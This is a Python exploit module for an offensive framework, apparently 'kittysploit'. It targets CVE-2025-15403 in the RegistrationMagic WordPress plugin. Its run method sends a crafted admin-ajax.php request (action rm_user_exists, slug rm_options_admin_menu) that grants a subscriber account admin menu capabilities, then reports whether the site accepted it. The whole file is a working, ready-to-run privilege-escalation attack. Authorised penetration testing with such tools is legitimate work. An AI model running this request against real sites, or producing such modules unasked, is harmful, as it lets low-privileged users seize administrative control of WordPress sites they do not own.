#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RegistrationMagic CVE-2025-15403 — rm_options_admin_menu capability tampering."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "RegistrationMagic CVE-2025-15403 menu privesc",
        "description": (
            "Triggers rm_user_exists against rm_options_admin_menu to grant subscriber admin menu "
            "capabilities. Does not yield a direct WordPress session — follow with subscriber chain."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-15403"],
        "references": ["https://github.com/Nxploited/CVE-2025-15403"],
        "tags": ["wordpress", "registrationmagic", "privesc", "auxiliary", "cve-2025-15403"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        r = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "action": "rm_user_exists",
                "rm_slug": "rm_options_admin_menu",
                "order": ",menu1",
                "_Subscriber": "1",
                "restore": "false",
                "enable_admin_order": "yes",
            },
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            print_error("admin-ajax failed")
            return False
        body = (r.text or "").strip()
        if body == "-1":
            print_error("Plugin returned -1 (not vulnerable or blocked)")
            return False
        print_success("Menu capability manipulation request accepted")
        print_status(f"Response: {body!r}")
        return True
